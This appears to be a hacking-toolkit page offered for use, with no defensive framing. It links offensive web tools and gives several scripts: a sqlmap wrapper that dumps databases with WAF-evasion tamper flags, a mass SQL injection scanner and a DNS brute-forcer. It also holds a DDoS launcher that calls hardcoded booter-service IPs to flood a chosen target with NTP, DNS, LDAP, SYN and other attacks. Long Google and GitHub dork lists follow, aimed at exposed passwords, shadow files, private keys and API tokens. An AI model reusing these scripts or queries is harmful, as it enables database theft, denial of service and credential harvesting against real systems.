### Web Attacks:

- [SQLmap](https://github.com/sqlmapproject/sqlmap)
- [XAttacker](https://github.com/Moham3dRiahi/XAttacker)
- [Fuxploider](https://github.com/almandin/fuxploider)
- [Wordpresscan](https://github.com/swisskyrepo/Wordpresscan)
- [SiteBroker](https://github.com/Anon-Exploiter/SiteBroker)
- [NoSQLMap](https://github.com/codingo/NoSQLMap)
- [Sqli-scanner](https://github.com/the-c0d3r/sqli-scanner)
- [Joomscan](https://github.com/rezasp/joomscan)
- [Metagoofil](https://github.com/laramies/metagoofil)
- [Sublist3r](https://github.com/aboul3la/Sublist3r)
- [WAFNinja](https://github.com/khalilbijjou/WAFNinja)
- [Dirsearch](https://github.com/maurosoria/dirsearch)
- [XSStrike](https://github.com/s0md3v/XSStrike)
- [LinksF1nd3r](https://github.com/ihebski/LinksF1nd3r)
- [Rapidscan](https://github.com/skavngr/rapidscan)

#### Auto_scanners

![hot](https://cirt.net/files/alienlogo_3.gif)

- [BruteX](https://github.com/1N3/BruteX)
- [BlackWidow](https://github.com/1N3/BlackWidow)
- [S3Scanner](https://github.com/sa7mon/S3Scanner)
- [CRLF-Injection-Scanner](https://github.com/MichaelStott/CRLF-Injection-Scanner)
- [jaeles](https://github.com/jaeles-project/jaeles)
- [kube-scan](https://github.com/random-robbie/kube-scan)
- [Subrake](https://github.com/hash3liZer/Subrake)
- [Osmedeus](https://github.com/j3ssie/Osmedeus)
- [nikto](https://github.com/sullo/nikto)

#### sqlmap automate

```
#!/bin/bash

clear



echo "
              *         *      *         *
          ***          **********          ***
       *****           **********           *****
     *******           **********           *******
   **********         ************         **********
  ****************************************************
 ******************************************************
********************************************************
********************************************************
********************************************************
 ******************************************************
  ********      ************************      ********
   *******       *     *********      *       *******
     ******             *******              ******
       *****             *****              *****
          ***             ***              ***
            **             *              **
"

echo
echo -n "[+] Website: " && read site
echo

python2 sqlmap.py -u $site --threads=10 --level=3 --risk=3 --random-agent --is-dba --current-db --tamper=charencode,space2comment,between,modsecurityzeroversioned --dbs --batch
echo
echo -n "[+] DB: " && read db
echo
		
python2 sqlmap.py -u $site --threads=10 --level=3 --risk=3 --random-agent --is-dba --current-db --tamper=between,modsecurityzeroversioned  -D $db --tables
																		 
echo
echo -n "[+] Table: " && read tb
echo

python2 sqlmap.py -u $site --threads=10 --level=3 --risk=3 --random-agent --is-dba --current-db --tamper=between,modsecurityzeroversioned --batch -D $db -T $tb --columns

echo
echo -n "[+] Column: " && read cl
echo

python2 sqlmap.py -u $site --threads=10 --level=3 --risk=3 --random-agent --is-dba --current-db --tamper=between,modsecurityzeroversioned --batch -D $db -T $tb -C $cl --dump

```
#### FireWave-Mass-Sql-Scan

usage: python FireWave.py domains.txt

Required: requests and colorama

install: pip install requests

install: pip install colorama

```
# coding: utf-8

import sys
import os



os.system("clear||cls")

try:
        import requests
except:
        print ("install requests: pip install requests")
	      						
try:
        from colorama import *

except:
        print ("install colorama: pip install colorama")
				  
print (Style.BRIGHT + Fore.CYAN + '''
 /$$$$$$$$ /$$                     /$$      /$$
| $$_____/|__/                    | $$  /$ | $$
| $$       /$$  /$$$$$$   /$$$$$$ | $$ /$$$| $$  /$$$$$$  /$$    /$$ /$$$$$$
| $$$$$   | $$ /$$__  $$ /$$__  $$| $$/$$ $$ $$ |____  $$|  $$  /$$//$$__  $$
| $$__/   | $$| $$  \__/| $$$$$$$$| $$$$_  $$$$  /$$$$$$$ \  $$/$$/| $$$$$$$$
| $$      | $$| $$      | $$_____/| $$$/ \  $$$ /$$__  $$  \  $$$/ | $$_____/
| $$      | $$| $$      |  $$$$$$$| $$/   \  $$|  $$$$$$$   \  $/  |  $$$$$$$
|__/      |__/|__/       \_______/|__/     \__/ \_______/    \_/    \_______/
Usage: FireWave.py <target.txt> \n''' + Fore.RESET + Style.RESET_ALL)

sql = "%5c"
logs = []
webi = open('result.txt','w')
headers = {'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_8) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.803.0 Safari/535.1'}

if len(sys.argv) >= 2:
   target = sys.argv[1]
   with open (target) as tag:
       lista = tag.readlines()
       for listy in lista:
           x = listy.rstrip('\n')
           y = sql.rstrip('\n')
           web = x+y
           web = web.strip('\n')
           up = requests.get(web, headers=headers)
           if "mysql_num_rows()" in up.text or "Mysql" in up.text or "Sql syntax" in up.text or "Warning: mysql_fetch_array()" in up.text or "valid MySQL result" in up.text or "MySqlClient." in up.text or "mysql_fetch_assoc()" in up.text or "mysql_fetch_array" in up.text or "session_start()"in up.text or "getimagesize()" in up.text or "is_writable" in up.text or "unknown()" in up.text or "mysql_result()" in up.text or "pg_exec()" in up.text or "mysql_query()" in up.text or  "array_merge" in up.text or "Pregmatch()" in up.text or "filesize()" in up.text or "require()"in up.text or  "You have an error in your SQL syntax" in up.text or  "Warning: mysql" in up.text or "function.mysql" in up.text or "MySQL result index" in up.text or "MySQL Error" in up.text or "MySQL ODBC" in up.text or  "MySQL Driver" in up.text or "mysqli.query" in up.text or "numrows" in up.text or "mysql error:" in up.text or "supplied argument is not a valid MySQL result resource" in up.text or  "on MySQL result index" in up.text or "Error Executing Database Query" in up.text or "mysql" in up.text or "SQL" in up.text:
              print
              print ("[+] Vull SQL: " + Style.BRIGHT + Fore.GREEN + x + Fore.RESET + Style.RESET_ALL)
									
	      logs.append(x+'\n')
           else:
                print 
                print ("[!] Not Vull: " + Style.BRIGHT +  Fore.RED + x + Fore.RESET + Style.RESET_ALL)

webi.writelines(logs)
webi.close()
```
#### DebWave
Enumerador de DNS com WordList, feito em python utilizando Sys e Socket!

Required Socket and Sys

usage: debwave.py target list.txt

remove http and https !

exemple http://www.google.com/ -> google.com
```
import socket
import sys
import os

os.system("clear||cls")

print ("""
                             @@@
                             @@@
                              @@@                       H A P P Y
                              @@@
                      @@@@@@@@@@@@@@@@@@@@@@         H A L L O W E E N
                    @@@@@@@@@@@@@@@@@@@@@@@@@@
                  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
                @@@@@@@@ @@@@@@@@@@@@@@@@ @@@@@@@@
              @@@@@@@@@   @@@@@@@@@@@@@@   @@@@@@@@@
            @@@@@@@@@@     @@@@@@@@@@@@     @@@@@@@@@@
           @@@@@@@@@@       @@@@  @@@@       @@@@@@@@@@
           @@@@@@@@@@@@@@@@@@@@    @@@@@@@@@@@@@@@@@@@@
           @@@@@@@@@@@@@@@@@@        @@@@@@@@@@@@@@@@@@
           @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
           @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
           @@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@
            @@@@@@@@  @@ @@ @@ @@ @@ @@ @@ @  @@@@@@@@
              @@@@@@@                        @@@@@@@
                @@@@@@  @@ @@ @@ @@ @@ @@ @ @@@@@@
                  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
                    @@@@@@@@@@@@@@@@@@@@@@@@@@
                      @@@@@@@@@@@@@@@@@@@@@@
 		   | DNS Enumering BruteForce |
		   |           ./O8           |""")

print
print "Usage: DebWave.py <target> <list.txt> "
print

if len(sys.argv) >= 2:
   target = sys.argv[1]
   lista = sys.argv[2]
   with open (lista) as arquivo:
       brute = arquivo.readlines()
       for btf in brute:
           DNS = btf.rstrip("\n") + "." + target
           try:
               print "[#] DNS: " + DNS + " : "+ socket.gethostbyname(DNS)
           except socket.gaierror:
               pass
```

#### DDOS

```
import os
import time
# Coding by KriptonWave

# Twitter: @KryptonWave1
# Discord: KriptonWave#9010


os.system("clear||cls")


index = (r"""
██████╗ ██╗████████╗██╗ ██████╗ █████╗ 
██╔══██╗██║╚══██╔══╝██║██╔════╝██╔══██╗
██████╔╝██║   ██║   ██║██║     ███████║
██╔═══╝ ██║   ██║   ██║██║     ██╔══██║
██║     ██║   ██║   ██║╚██████╗██║  ██║
╚═╝     ╚═╝   ╚═╝   ╚═╝ ╚═════╝╚═╝  ╚═╝
""")
 
menu = (r"""[1] NTP      [4] ACK      [7] STROM
[2] DNS      [5] XMASS    [8] COD
[3] LDAP     [6] SSYN""")


headers = {'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_8) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.803.0 Safari/535.1'}
          

try:
    import requests

except:
       print (index)
       print ("[!] Install requests: pip install requests")
       exit()


print (index)
print (menu)

print (" ")
esc = input("Numero da opção desejada: ")
print (" ")
host = input("Target/Host: ")
port = input("Port: ")
time = input("Time: ")

if esc == "1":
   esc = "NTP"

   api = (f"api.php?&host={host}&port={port}&time={time}&method={esc}")
   ips = ["185.212.47.32","185.158.248.182","176.10.118.226","185.212.47.205","31.214.157.239"]

   for x in ips:

       atk = ("http://"+x+"/"+api)
       r = requests.get(atk, headers=headers)
              
       if "Attack Launch On" in r.text:
            while True:
               print (f"[+] ATACK INICIADO EM: {host}")
       else:
            print ("[!] ERROR")
            exit()

elif esc == "2":
     esc = "DNS"
     
     api = (f"api.php?&host={host}&port={port}&time={time}&method={esc}")
     ips = ["185.212.47.32","185.158.248.182","176.10.118.226","185.212.47.205","31.214.157.239"]

     for x in ips:

         atk = ("http://"+x+"/"+api)
         r = requests.get(atk, headers=headers)
	 
         if "Attack Launch On" in r.text:
            while True:
                print (f"[+] ATACK INICIADO EM: {host}")
         else:
              print ("[!] ERROR")
              exit()

elif esc == "3":
     esc = "LDAP"

     api = (f"api.php?&host={host}&port={port}&time={time}&method={esc}")
     ips = ["185.212.47.32","185.158.248.182","176.10.118.226","185.212.47.205","31.214.157.239"]

     for x in ips:
         atk = ("http://"+x+"/"+api)
         r = requests.get(atk, headers=headers)
 
         if "Attack Launch On" in r.text:
            while True:
                print (f"[+] ATACK INICIADO EM: {host}")
         else:
              print ("[!] ERROR")
              exit()

elif esc == "4":
     esc = "ACK"
     
     api = (f"api.php?&host={host}&port={port}&time={time}&method={esc}")
     ips = ["185.212.47.32","185.158.248.182","176.10.118.226","185.212.47.205","31.214.157.239"]

     for x in ips:
         atk = ("http://"+x+"/"+api)
         r = requests.get(atk, headers=headers)

         if "Attack Launch On" in r.text:
            while True:
                print (f"[+] ATACK INICIADO EM: {host}")
         else:
              print ("[!] ERROR")
              exit()
elif esc == "5":
     esc = "XMASS"
     
     api = (f"api.php?&host={host}&port={port}&time={time}&method={esc}")
     ips = ["185.212.47.32","185.158.248.182","176.10.118.226","185.212.47.205","31.214.157.239"]

     for x in ips:
         atk = ("http://"+x+"/"+api)
         r = requests.get(atk,headers=headers)

         if "Attack Launch On" in r.text:
            while True:
                print (f"[+] ATACK INICIADO EM: {host}")
         else:
              print ("[!] ERROR")
              exit()

elif esc == "6":
     esc = "SSYN"

     api = (f"api.php?&host={host}&port={port}&time={time}&method={esc}")
     ips = ["185.212.47.32","185.158.248.182","176.10.118.226","185.212.47.205","31.214.157.239"]

     for x in ips:
         atk = ("http://"+x+"/"+api)
         r = requests.get(atk, headers=headers)

         if "Attack Launch On" in r.text:
            while True:
                print (f"[+] ATACK INICIADO EM: {host}")
         else:
              print ("[!] ERROR")
              exit()

elif esc == "7":
     esc = "STROM"

     api = (f"api.php?&host={host}&port={port}&time={time}&method={esc}")
     ips = ["185.212.47.32","185.158.248.182","176.10.118.226","185.212.47.205","31.214.157.239"]
     
     for x in ips:
         atk = ("http://"+x+"/"+api)
         r = requests.get(atk, headers=headers)

         if "Attack Launch On" in r.text:
            while True:
                print (f"[+] ATACK INICIADO EM: {host}")
         else:
              print ("[!] ERROR")
              exit()

elif esc == "8":
     esc = "COD"

     api = (f"api.php?&host={host}&port={port}&time={time}&method={esc}")
     ips = ["185.212.47.32","185.158.248.182","176.10.118.226","185.212.47.205","31.214.157.239"]

     for x in ips:
         atk = ("http://"+x+"/"+api)
         r = requests.get(atk, headers=headers)

         if "Attack Launch On" in r.text:
            while True:
                print (f"[+] ATACK INICIADO EM: {host}")
         else:
              print ("[!] ERROR")
              exit()

```

```

"          _                      _          "
"   _     /||       .   .        ||\     _   "
"  ( }    \||D    '   '     '   C||/    { %  "
" | /\__,=_[_]   '  .   . '       [_]_=,__/\ |"
" |_\_  |----|                    |----|  _/_|"
" |  |/ |    |                    |    | \|  |"
" |  /_ |    |                    |    | _\  |"

	It is all fun and games until someone gets hacked!
 
------------------------------------------------------------------------------------------
Explanations:

cache: If you include other words in the query, Google will highlight those words within
	the cached document. For instance, [cache:www.google.com web] will show the cached
	content with the word “web” highlighted. This functionality is also accessible by
	clicking on the “Cached” link on Google’s main results page. The query [cache:] will
	show the version of the web page that Google has in its cache. For instance,
	[cache:www.google.com] will show Google’s cache of the Google homepage. Note there
	can be no space between the “cache:” and the web page url.
------------------------------------------------------------------------------------------
link: The query [link:] will list webpages that have links to the specified webpage.
	For instance, [link:www.google.com] will list webpages that have links pointing to the
	Google homepage. Note there can be no space between the “link:” and the web page url.
------------------------------------------------------------------------------------------
related: The query [related:] will list web pages that are “similar” to a specified web
	page. For instance, [related:www.google.com] will list web pages that are similar to
	the Google homepage. Note there can be no space between the “related:” and the web
	page url.
------------------------------------------------------------------------------------------
info: The query [info:] will present some information that Google has about that web
	page. For instance, [info:www.google.com] will show information about the Google
	homepage. Note there can be no space between the “info:” and the web page url.
------------------------------------------------------------------------------------------
define: The query [define:] will provide a definition of the words you enter after it,
	gathered from various online sources. The definition will be for the entire phrase
	entered (i.e., it will include all the words in the exact order you typed them).
------------------------------------------------------------------------------------------
stocks: If you begin a query with the [stocks:] operator, Google will treat the rest
	of the query terms as stock ticker symbols, and will link to a page showing stock
	information for those symbols. For instance, [stocks: intc yhoo] will show information
	about Intel and Yahoo. (Note you must type the ticker symbols, not the company name.)
------------------------------------------------------------------------------------------
site: If you include [site:] in your query, Google will restrict the results to those
	websites in the given domain. For instance, [help site:www.google.com] will find pages
	about help within www.google.com. [help site:com] will find pages about help within
	.com urls. Note there can be no space between the “site:” and the domain.
------------------------------------------------------------------------------------------
allintitle: If you start a query with [allintitle:], Google will restrict the results
	to those with all of the query words in the title. For instance,
	[allintitle: google search] will return only documents that have both “google”
	and “search” in the title.
------------------------------------------------------------------------------------------
intitle: If you include [intitle:] in your query, Google will restrict the results
	to documents containing that word in the title. For instance, [intitle:google search]
	will return documents that mention the word “google” in their title, and mention the
	word “search” anywhere in the document (title or no). Note there can be no space
	between the “intitle:” and the following word. Putting [intitle:] in front of every
	word in your query is equivalent to putting [allintitle:] at the front of your
	query: [intitle:google intitle:search] is the same as [allintitle: google search].
------------------------------------------------------------------------------------------
allinurl: If you start a query with [allinurl:], Google will restrict the results to
	those with all of the query words in the url. For instance, [allinurl: google search]
	will return only documents that have both “google” and “search” in the url. Note
	that [allinurl:] works on words, not url components. In particular, it ignores
	punctuation. Thus, [allinurl: foo/bar] will restrict the results to page with the
	words “foo” and “bar” in the url, but won’t require that they be separated by a
	slash within that url, that they be adjacent, or that they be in that particular
	word order. There is currently no way to enforce these constraints.
------------------------------------------------------------------------------------------
inurl: If you include [inurl:] in your query, Google will restrict the results to
	documents containing that word in the url. For instance, [inurl:google search] will
	return documents that mention the word “google” in their url, and mention the word
	“search” anywhere in the document (url or no). Note there can be no space between
	the “inurl:” and the following word. Putting “inurl:” in front of every word in your
	query is equivalent to putting “allinurl:” at the front of your query:
	[inurl:google inurl:search] is the same as [allinurl: google search].
------------------------------------------------------------------------------------------
Nina Simone intitle:”index.of” “parent directory” “size” “last modified” “description” I Put A Spell On You (mp4|mp3|avi|flac|aac|ape|ogg) -inurl:(jsp|php|html|aspx|htm|cf|shtml|lyrics-realm|mp3-collection) -site:.info
Bill Gates intitle:”index.of” “parent directory” “size” “last modified” “description” Microsoft (pdf|txt|epub|doc|docx) -inurl:(jsp|php|html|aspx|htm|cf|shtml|ebooks|ebook) -site:.info
parent directory /appz/ -xxx -html -htm -php -shtml -opendivx -md5 -md5sums
parent directory DVDRip -xxx -html -htm -php -shtml -opendivx -md5 -md5sums
parent directory Xvid -xxx -html -htm -php -shtml -opendivx -md5 -md5sums
parent directory Gamez -xxx -html -htm -php -shtml -opendivx -md5 -md5sums
parent directory MP3 -xxx -html -htm -php -shtml -opendivx -md5 -md5sums
parent directory Name of Singer or album -xxx -html -htm -php -shtml -opendivx -md5 -md5sums
filetype:config inurl:web.config inurl:ftp
“Windows XP Professional” 94FBR
ext:(doc | pdf | xls | txt | ps | rtf | odt | sxw | psw | ppt | pps | xml) (intext:confidential salary | intext:"budget approved") inurl:confidential
ext:(doc | pdf | xls | txt | ps | rtf | odt | sxw | psw | ppt | pps | xml) (intext:confidential salary | intext:”budget approved”) inurl:confidential
ext:inc "pwd=" "UID="
ext:ini intext:env.ini
ext:ini Version=... password
ext:ini Version=4.0.0.4 password
ext:ini eudora.ini
ext:ini intext:env.ini
ext:log "Software: Microsoft Internet Information Services *.*"
ext:log "Software: Microsoft Internet Information
ext:log "Software: Microsoft Internet Information Services *.*"
ext:log \"Software: Microsoft Internet Information Services *.*\"
ext:mdb   inurl:*.mdb inurl:fpdb shop.mdb
ext:mdb inurl:*.mdb inurl:fpdb shop.mdb
ext:mdb inurl:*.mdb inurl:fpdb shop.mdb
filetype:SWF SWF
filetype:TXT TXT
filetype:XLS XLS
filetype:asp   DBQ=" * Server.MapPath("*.mdb")
filetype:asp "Custom Error Message" Category Source
filetype:asp + "[ODBC SQL"
filetype:asp DBQ=" * Server.MapPath("*.mdb")
filetype:asp DBQ=\" * Server.MapPath(\"*.mdb\") 
filetype:asp “Custom Error Message” Category Source
filetype:bak createobject sa
filetype:bak inurl:"htaccess|passwd|shadow|htusers"
filetype:bak inurl:\"htaccess|passwd|shadow|htusers\" 
filetype:conf inurl:firewall -intitle:cvs 
filetype:conf inurl:proftpd. PROFTP FTP server configuration file reveals
filetype:dat "password.dat
filetype:dat \"password.dat\" 
filetype:eml eml +intext:"Subject" +intext:"From" +intext:"To"
filetype:eml eml +intext:\"Subject\" +intext:\"From\" +intext:\"To\" 
filetype:eml eml +intext:”Subject” +intext:”From” +intext:”To”
filetype:inc dbconn 
filetype:inc intext:mysql_connect
filetype:inc mysql_connect OR mysql_pconnect 
filetype:log inurl:"password.log"
filetype:log username putty PUTTY SSH client logs can reveal usernames
filetype:log “PHP Parse error” | “PHP Warning” | “PHP Error”
filetype:mdb inurl:users.mdb
filetype:ora ora
filetype:ora tnsnames
filetype:pass pass intext:userid
filetype:pdf "Assessment Report" nessus
filetype:pem intext:private
filetype:properties inurl:db intext:password
filetype:pst inurl:"outlook.pst"
filetype:pst pst -from -to -date
filetype:reg reg +intext:"defaultusername" +intext:"defaultpassword"
filetype:reg reg +intext:\"defaultusername\" +intext:\"defaultpassword\" 
filetype:reg reg +intext:â? WINVNC3â?
filetype:reg reg +intext:”defaultusername” +intext:”defaultpassword”
filetype:reg reg HKEY_ Windows Registry exports can reveal
filetype:reg reg HKEY_CURRENT_USER SSHHOSTKEYS
filetype:sql "insert into" (pass|passwd|password)
filetype:sql ("values * MD5" | "values * password" | "values * encrypt")
filetype:sql (\"passwd values\" | \"password values\" | \"pass values\" ) 
filetype:sql (\"values * MD\" | \"values * password\" | \"values * encrypt\") 
filetype:sql +"IDENTIFIED BY" -cvs
filetype:sql password
filetype:sql password 
filetype:sql “insert into” (pass|passwd|password)
filetype:url +inurl:"ftp://" +inurl:";@"
filetype:url +inurl:\"ftp://\" +inurl:\";@\" 
filetype:url +inurl:”ftp://” +inurl:”;@”
filetype:xls inurl:"email.xls"
filetype:xls username password email
index of: intext:Gallery in Configuration mode
index.of passlist
index.of perform.ini mIRC IRC ini file can list IRC usernames and
index.of.dcim 
index.of.password 
intext:" -FrontPage-" ext:pwd inurl:(service | authors | administrators | users)
intext:""BiTBOARD v2.0" BiTSHiFTERS Bulletin Board"
intext:"# -FrontPage-" ext:pwd inurl:(service | authors | administrators | users) "# -FrontPage-" inurl:service.pwd
intext:"#mysql dump" filetype:sql
intext:"#mysql dump" filetype:sql 21232f297a57a5a743894a0e4a801fc3
intext:"A syntax error has occurred" filetype:ihtml
intext:"ASP.NET_SessionId" "data source="
intext:"About Mac OS Personal Web Sharing"
intext:"An illegal character has been found in the statement" -"previous message"
intext:"AutoCreate=TRUE password=*"
intext:"Can't connect to local" intitle:warning
intext:"Certificate Practice Statement" filetype:PDF | DOC
intext:"Certificate Practice Statement" inurl:(PDF | DOC)
intext:"Copyright (c) Tektronix, Inc." "printer status"
intext:"Copyright © Tektronix, Inc." "printer status"
intext:"Emergisoft web applications are a part of our"
intext:"Error Diagnostic Information" intitle:"Error Occurred While"
intext:"Error Message : Error loading required libraries."
intext:"Establishing a secure Integrated Lights Out session with" OR intitle:"Data Frame - Browser not HTTP 1.1 compatible" OR intitle:"HP Integrated Lights-
intext:"Fatal error: Call to undefined function" -reply -the -next
intext:"Fill out the form below completely to change your password and user name. If new username is left blank, your old one will be assumed." -edu
intext:"Generated   by phpSystem"
intext:"Generated by phpSystem"
intext:"Host Vulnerability Summary Report"
intext:"HostingAccelerator" intitle:"login" +"Username" -"news" -demo
intext:"IMail Server Web Messaging" intitle:login
intext:"Incorrect syntax near"
intext:"Index of" /"chat/logs"
intext:"Index of /network" "last modified"
intext:"Index of /" +.htaccess
intext:"Index of /" +passwd
intext:"Index of /" +password.txt
intext:"Index of /admin"
intext:"Index of /backup"
intext:"Index of /mail"
intext:"Index of /password"
intext:"Microsoft (R) Windows * (TM) Version * DrWtsn32 Copyright (C)" ext:log
intext:"Microsoft CRM : Unsupported Browser Version"
intext:"Microsoft ® Windows * ™ Version * DrWtsn32 Copyright ©" ext:log
intext:"Network Host Assessment Report" "Internet Scanner"
intext:"Network Vulnerability   Assessment Report"
intext:"Network Vulnerability Assessment Report"
intext:"Network Vulnerability Assessment Report" 本文来自 pc007.com
intext:"SQL Server Driver][SQL Server]Line 1: Incorrect syntax near"
intext:"Thank you for your order"   +receipt
intext:"Thank you for your order" +receipt
intext:"Thank you for your purchase" +download
intext:"The following report contains confidential information" vulnerability -search
intext:"phpMyAdmin MySQL-Dump" "INSERT INTO" -"the"
intext:"phpMyAdmin MySQL-Dump" filetype:txt
intext:"phpMyAdmin" "running on" inurl:"main.php"
intextpassword | passcode)   intextusername | userid | user) filetype:csv
intextpassword | passcode) intextusername | userid | user) filetype:csv
intitle:"index of" +myd size
intitle:"index of" etc/shadow
intitle:"index of" htpasswd
intitle:"index of" intext:connect.inc
intitle:"index of" intext:globals.inc
intitle:"index of" master.passwd
intitle:"index of" master.passwd 007电脑资讯
intitle:"index of" members OR accounts
intitle:"index of" mysql.conf OR mysql_config
intitle:"index of" passwd
intitle:"index of" people.lst
intitle:"index of" pwd.db
intitle:"index of" spwd
intitle:"index of" user_carts OR user_cart
intitle:"index.of *" admin news.asp configview.asp
intitle:("TrackerCam Live Video")|("TrackerCam Application Login")|("Trackercam Remote") -trackercam.com
intitle:(“TrackerCam Live Video”)|(“TrackerCam Application Login”)|(“Trackercam Remote”) -trackercam.com
inurl:admin inurl:userlist Generic userlist files

------------------------------------------------------------------------------------------
Using special search string to find vulnerable websites:

inurl:php?=id1
inurl:index.php?id=
inurl:trainers.php?id=
inurl:buy.php?category=
inurl:article.php?ID=
inurl:play_old.php?id=
inurl:declaration_more.php?decl_id=
inurl:pageid=
inurl:games.php?id=
inurl:page.php?file=
inurl:newsDetail.php?id=
inurl:gallery.php?id=
inurl:article.php?id=
inurl:show.php?id=
inurl:staff_id=
inurl:newsitem.php?num= andinurl:index.php?id=
inurl:trainers.php?id=
inurl:buy.php?category=
inurl:article.php?ID=
inurl:play_old.php?id=
inurl:declaration_more.php?decl_id=
inurl:pageid=
inurl:games.php?id=
inurl:page.php?file=
inurl:newsDetail.php?id=
inurl:gallery.php?id=
inurl:article.php?id=
inurl:show.php?id=
inurl:staff_id=
inurl:newsitem.php?num=
```
### github dorks

```
filename:.npmrc _auth
filename:.dockercfg auth
extension:pem private
extension:ppk private
filename:id_rsa or filename:id_dsa
extension:sql mysql dump
extension:sql mysql dump password
filename:credentials aws_access_key_id
filename:.s3cfg
filename:wp-config.php
filename:.htpasswd
filename:.env DB_USERNAME NOT homestead
filename:.env MAIL_HOST=smtp.gmail.com
filename:.git-credentials
PT_TOKEN language:bash
filename:.bashrc password
filename:.bashrc mailchimp
filename:.bash_profile aws
rds.amazonaws.com password
extension:json api.forecast.io
extension:json mongolab.com
extension:yaml mongolab.com
jsforce extension:js conn.login
SF_USERNAME "salesforce"
filename:.tugboat NOT "_tugboat"
HEROKU_API_KEY language:shell
HEROKU_API_KEY language:json
filename:.netrc password
filename:_netrc password
filename:hub oauth_token
filename:robomongo.json
filename:filezilla.xml Pass
filename:recentservers.xml Pass
filename:config.json auths
filename:idea14.key
filename:config irc_pass
filename:connections.xml
filename:express.conf path:.openshift
filename:.pgpass
filename:proftpdpasswd
filename:ventrilo_srv.ini
[WFClient] Password= extension:ica
filename:server.cfg rcon password
JEKYLL_GITHUB_TOKEN
filename:.bash_history
filename:.cshrc
filename:.history
filename:.sh_history
filename:sshd_config
filename:dhcpd.conf
filename:prod.exs NOT "prod.secret.exs"
filename:prod.secret.exs
filename:configuration.php JConfig password
filename:config.php dbpasswd
filename:config.php pass
path:sites databases password
shodan_api_key language:python
shodan_api_key language:shell
shodan_api_key language:json
shodan_api_key language:ruby
filename:shadow path:etc
filename:passwd path:etc
extension:avastlic
extension:dbeaver-data-sources.xml
filename:sftp-config.json
filename:.esmtprc password
extension:json googleusercontent client_secret
HOMEBREW_GITHUB_API_TOKEN language:shell
```
